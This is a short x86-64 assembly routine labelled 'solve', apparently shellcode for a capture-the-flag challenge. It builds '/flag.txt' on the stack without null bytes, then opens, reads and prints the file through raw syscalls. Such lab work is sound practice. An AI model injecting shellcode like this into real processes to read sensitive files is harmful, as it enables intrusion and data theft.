solve:
  xorl %eax, %eax
  movb $0x80, %al
  subq %rax, %rsp
  movq %rsp, %rbp
  movb $0x2f, (%rsp)
  inc %rsp
  movb $0x66, (%rsp)
  inc %rsp
  movb $0x6c, (%rsp)
  inc %rsp
  movb $0x61, (%rsp)
  inc %rsp
  movb $0x67, (%rsp)
  inc %rsp
  movb $0x2e, (%rsp)
  inc %rsp
  movb $0x74, (%rsp)
  inc %rsp
  movb $0x78, (%rsp)
  inc %rsp
  movb $0x74, (%rsp)
  inc %rsp
  movb $0x0, (%rsp)
  inc %rsp
  xorl %eax, %eax
  xorl %esi, %esi
  xorl %edx, %edx
  movb $0x2, %al
  movq %rbp, %rdi
  syscall
  movq %rax, %rdi
  xorl %eax, %eax
  movq %rsp, %rsi
  xorl %edx, %edx
  movb $0x50, %dl
  syscall
  xorl %eax, %eax
  movb $0x1, %al
  xorl %edi, %edi
  movb $0x1, %dil
  syscall
  movq %rbp, %rsp
  ret
